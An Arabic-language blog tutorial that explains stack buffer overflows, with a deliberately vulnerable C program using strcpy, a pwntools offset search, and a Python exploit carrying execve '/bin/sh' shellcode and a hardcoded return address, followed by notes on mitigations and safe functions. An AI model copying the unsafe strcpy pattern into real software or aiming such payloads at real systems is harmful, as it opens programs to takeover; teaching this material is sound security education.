---
layout: blog
title: "Buffer Overflow من الأساس للاستغلال: رحلة عميقة في أخطر ثغرات الذاكرة"
date: 2026-03-29T04:18:38Z
category: "تقنية"
excerpt: "ثغرات Buffer Overflow تمثل حجر الأساس في عالم Offensive Security. رغم أنها من أقدم أنواع الثغرات، إلا أنها لا تزال تظهر في أنظمة حديثة وتشكل خطرًا حقيقيًا. في هذه المقالة نستعرض الآلية الداخلية للثغرة وكيفية استغلالها عمليًا."
read_time: 8
tags: ["Buffer Overflow", "Binary Exploitation", "Memory Corruption", "Shellcode", "Offensive Security"]
slug: "buffer-overflow-guide"
---

## فهم البنية الأساسية للذاكرة

قبل الحديث عن Buffer Overflow، علينا فهم كيف تنظم البرامج الذاكرة. عند تشغيل أي برنامج، يخصص نظام التشغيل له مساحة في الذاكرة مقسمة إلى عدة أقسام:

- **Stack**: يحتوي على المتغيرات المحلية وعناوين Return addresses
- **Heap**: للذاكرة الديناميكية المخصصة أثناء التشغيل
- **Data/BSS**: للمتغيرات الثابتة والعامة
- **Text**: يحتوي على الكود القابل للتنفيذ

الـ Stack هو المنطقة الأكثر أهمية في سياق Buffer Overflow. ينمو من عناوين الذاكرة العليا نحو السفلى، ويحتوي على Stack frames لكل دالة يتم استدعاؤها.

## كيف تحدث الثغرة؟

Buffer Overflow يحدث عندما يكتب البرنامج بيانات تتجاوز حجم المساحة المخصصة (Buffer). لنأخذ مثالًا بسيطًا:

```c
#include <string.h>
#include <stdio.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("Data: %s\n", buffer);
}

int main(int argc, char **argv) {
    if(argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

المشكلة هنا أن `strcpy` لا تفحص حجم البيانات المنسوخة. إذا كان حجم `input` أكبر من 64 بايت، سيتم الكتابة فوق البيانات المجاورة في الـ Stack، بما فيها الـ Return address.

## تشريح Stack Frame

عند استدعاء دالة، يحدث التالي على الـ Stack:

```
Low Memory
+------------------+
|  Local Variables |
+------------------+
|  Saved EBP       |  <- Base Pointer
+------------------+
|  Return Address  |  <- Instruction Pointer
+------------------+
|  Function Args   |
+------------------+
High Memory
```

الـ Return address هو الهدف الأساسي. إذا تمكنا من الكتابة فوقه، نستطيع التحكم في تدفق البرنامج وتوجيهه لتنفيذ الكود الخاص بنا.

## من الاكتشاف للاستغلال

عملية الاستغلال تمر بعدة مراحل:

**1. اكتشاف الثغرة:**
نبدأ بإرسال بيانات كبيرة ومراقبة سلوك البرنامج. استخدام أدوات مثل GDB أو Immunity Debugger ضروري:

```bash
# إنشاء Pattern لتحديد Offset
gdb ./vulnerable_program
run $(python -c 'print "A"*100')
```

إذا حصلنا على Segmentation fault، نعرف أن الثغرة موجودة.

**2. تحديد الـ Offset:**
نحتاج لمعرفة عدد البايتات بالضبط قبل الوصول للـ Return address:

```python
from pwn import *

# إنشاء pattern فريد
pattern = cyclic(200)
with open('payload.txt', 'wb') as f:
    f.write(pattern)
```

بعد التشغيل والتعطل، نفحص قيمة EIP (Instruction Pointer) في الـ debugger لنحدد الـ offset الدقيق.

**3. بناء الـ Exploit:**
الآن نبني الـ payload الكامل:

```python
from struct import pack

# افترض أن الـ offset هو 76 بايت
offset = 76

# عنوان الـ shellcode في الذاكرة
ret_address = pack('<I', 0xbffff650)

# Shellcode لفتح shell
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# بناء الـ payload النهائي
payload = b"A" * (offset - len(shellcode))
payload += shellcode
payload += ret_address

print(payload)
```

## التحديات والحماية الحديثة

اليوم، استغلال Buffer Overflow أصبح أصعب بكثير بسبب آليات الحماية:

**DEP/NX (Data Execution Prevention):**
يمنع تنفيذ الكود من الـ Stack أو الـ Heap. للتغلب عليه، نستخدم تقنيات مثل ROP (Return-Oriented Programming).

**ASLR (Address Space Layout Randomization):**
يعشّي عناوين الذاكرة عند كل تشغيل، مما يجعل التوقع صعبًا. نحتاج لـ Information leak للتغلب عليه.

**Stack Canaries:**
قيم عشوائية توضع قبل الـ Return address. إذا تغيرت، يتوقف البرنامج. يمكن تجاوزها بتسريب قيمة الـ Canary أولاً.

```c
// مثال على Canary في GCC
void function() {
    // Stack canary يُدرج تلقائياً هنا
    char buffer[64];
    // Code
    // فحص الـ Canary قبل الـ Return
}
```

## الخلاصة والممارسات الآمنة

فهم Buffer Overflow ليس فقط لاستغلاله، بل لحماية أنظمتك. كمطور، استخدم دوماً:

- الدوال الآمنة مثل `strncpy` و `fgets` بدلاً من `strcpy` و `gets`
- تفعيل جميع آليات الحماية أثناء الـ Compilation
- مراجعة الكود المتعلق بمعالجة المدخلات بعناية

كـ Penetration tester، هذه المعرفة تفتح لك باب فهم ثغرات أعقد وتقنيات استغلال متقدمة مثل Heap exploitation و Format string vulnerabilities.
